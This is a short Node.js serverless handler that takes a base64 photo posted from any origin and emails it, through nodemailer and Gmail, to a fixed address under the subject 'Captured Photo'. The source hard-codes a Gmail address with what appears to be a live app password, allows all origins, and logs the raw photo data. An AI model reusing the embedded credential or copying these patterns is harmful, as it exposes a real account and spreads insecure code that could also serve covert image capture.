const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
  // Allow all origins (you can restrict to your frontend domain later)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Ensure it's a POST request
  if (req.method === 'POST') {
    const { photo } = req.body;

    // Check if photo data is present
    if (!photo) {
      return res.status(400).json({ success: false, message: 'No photo data received' });
    }

    // Log to help identify if photo data is received
    console.log('Received photo data:', photo);

    // Set up the transporter for Nodemailer
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'aleksadiscord1@gmail.com',
        pass: 'vamr kaxm pltr ifsf', // Use app password here
      },
    });

    // Set up email options
    const mailOptions = {
      from: 'aleksadiscord1@gmail.com',
      to: 'aleksatomic2008@gmail.com',
      subject: 'Captured Photo',
      text: 'Here is the captured photo.',
      attachments: [
        {
          filename: 'photo.jpg',
          content: photo, // Assuming photo is base64-encoded
          encoding: 'base64',
        },
      ],
    };

    // Send the email and handle success or failure
    try {
      await transporter.sendMail(mailOptions);
      res.status(200).json({ success: true, message: 'Photo sent successfully!' });
    } catch (error) {
      console.error('Error sending email:', error);
      res.status(500).json({ success: false, message: 'Error sending email', error: error.message });
    }
  } else {
    // Handle non-POST requests
    res.status(405).json({ success: false, message: 'Method Not Allowed' });
  }
};
